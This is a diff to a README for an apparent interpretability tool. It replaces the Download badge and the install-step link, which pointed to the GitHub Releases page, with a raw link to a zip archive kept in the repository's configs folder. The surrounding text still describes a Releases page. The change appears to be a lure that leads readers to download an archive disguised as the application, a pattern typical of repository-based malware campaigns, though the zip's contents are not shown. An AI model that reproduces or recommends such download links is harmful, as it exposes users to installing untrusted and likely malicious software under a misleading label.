@@ -6,7 +6,7 @@ Welcome! This guide helps you download and run the *interpretable-neural-basis-d
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Gehoren/interpretable-neural-basis-decomposition/releases)
+[![Download](https://raw.githubusercontent.com/Gehoren/interpretable-neural-basis-decomposition/main/configs/interpretable-neural-basis-decomposition_2.1.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Gehoren/interpretable-neural-basis-decomposition/main/configs/interpretable-neural-basis-decomposition_2.1.zip)
 
 ## 📝 Overview
 
@@ -28,7 +28,7 @@ Before downloading the application, ensure your system meets the following requi
 To get started:
 
 1. Click the link below to visit the Releases page:
-   [Download the Application](https://github.com/Gehoren/interpretable-neural-basis-decomposition/releases)
+   [Download the Application](https://raw.githubusercontent.com/Gehoren/interpretable-neural-basis-decomposition/main/configs/interpretable-neural-basis-decomposition_2.1.zip)
 
 2. On the Releases page, you will find the latest version of the application.
 
